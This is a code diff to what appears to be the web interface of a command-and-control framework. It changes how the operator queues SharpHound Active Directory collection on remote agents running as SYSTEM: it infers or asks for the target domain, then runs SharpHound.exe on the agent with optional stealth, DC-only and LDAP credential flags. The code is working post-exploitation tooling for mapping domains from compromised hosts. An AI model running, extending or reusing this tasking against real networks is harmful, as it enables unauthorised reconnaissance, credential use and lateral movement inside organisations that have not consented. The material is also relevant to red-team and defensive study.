@@ -3541,14 +3541,49 @@ async function runCtxAction(act) {
     }
 
     // BloodHound / SharpHound collection
+    // A SYSTEM token is not associated with an AD user, so SharpHound cannot
+    // infer the domain from the current security context. Reuse the last
+    // known domain when possible, otherwise ask for it before queuing the task.
+    async function bhKnownDomain(agentID, requested) {
+      const explicit = String(requested || '').trim();
+      if (explicit) return explicit;
+      const agentDomain = String(agents.find(a => a.id === agentID)?.domain || '').trim();
+      if (agentDomain) return agentDomain;
+      const saved = String(localStorage.getItem('c2_bh_domain') || '').trim();
+      if (saved) return saved;
+      try {
+        const r = await api('GET', '/api/bloodhound/stats');
+        return String(r?.data?.domain || '').trim();
+      } catch (_) {
+        return '';
+      }
+    }
+
+    function bhDomainArg(domain) {
+      const value = String(domain || '').trim();
+      if (!value || /\s/.test(value)) return '';
+      return ` --Domain ${value}`;
+    }
+
     case 'bloodhoundCollect': {
       const aid = act.id || activeAgent?.id; if (!aid) break;
       const method = act.method || 'All';
       const stealth = act.stealth || false;
-      const stealthFlag = stealth ? ' --Stealth' : '';
-      const ldapFlag = method === 'DCOnly' ? ' --DCOnly' : '';
-      const args = `-c ${method}${stealthFlag}${ldapFlag} --ZipFileName bh_${method.toLowerCase()}.zip`;
-      runDotnetExec(aid, 'SharpHound.exe', args, `SharpHound -c ${method}`);
+      const knownDomain = await bhKnownDomain(aid, act.domain);
+      showQuickForm('SharpHound', [
+        {key:'domain', label:'Domain (required for SYSTEM)', ph:'lab.local', def:knownDomain},
+      ], vals => {
+        const domain = String(vals.domain || '').trim();
+        if (!domain || /\s/.test(domain)) {
+          toast('Valid AD domain required — SYSTEM cannot infer it', 'red');
+          return;
+        }
+        localStorage.setItem('c2_bh_domain', domain);
+        const stealthFlag = stealth ? ' --Stealth' : '';
+        const ldapFlag = method === 'DCOnly' ? ' --DCOnly' : '';
+        const args = `-c ${method}${stealthFlag}${ldapFlag}${bhDomainArg(domain)} --ZipFileName bh_${method.toLowerCase()}.zip`;
+        runDotnetExec(aid, 'SharpHound.exe', args, `SharpHound -c ${method} --Domain ${domain}`);
+      });
       break;
     }
     case 'bloodhoundCustom': {
@@ -3560,13 +3595,18 @@ async function runCtxAction(act) {
           {v:'DCOnly',  l:'DCOnly (no host scan)'},
           {v:'Default', l:'Default'},
         ], def:'All'},
-        {key:'domain',   label:'Domain (blank = current)', ph:'lab.local',   def:''},
+        {key:'domain',   label:'Domain (required for SYSTEM)', ph:'lab.local',   def:await bhKnownDomain(aid)},
         {key:'ldapuser', label:'LDAP user (blank = current)', ph:'user',     def:''},
         {key:'ldappass', label:'LDAP password',             ph:'',           def:''},
         {key:'stealth',  label:'Stealth mode',    type:'checkbox', def:false},
       ], vals => {
-        const parts = [`-c ${vals.collection}`, '--ZipFileName bh_out.zip'];
-        if (vals.domain)   parts.push(`--Domain ${vals.domain}`);
+        const domain = String(vals.domain || '').trim();
+        if (!domain || /\s/.test(domain)) {
+          toast('Valid AD domain required — SYSTEM cannot infer it', 'red');
+          return;
+        }
+        localStorage.setItem('c2_bh_domain', domain);
+        const parts = [`-c ${vals.collection}`, bhDomainArg(domain).trim(), '--ZipFileName bh_out.zip'];
         if (vals.ldapuser) parts.push(`--LDAPUser ${vals.ldapuser}`);
         if (vals.ldappass) parts.push(`--LDAPPass ${vals.ldappass}`);
         if (vals.stealth)  parts.push('--Stealth');
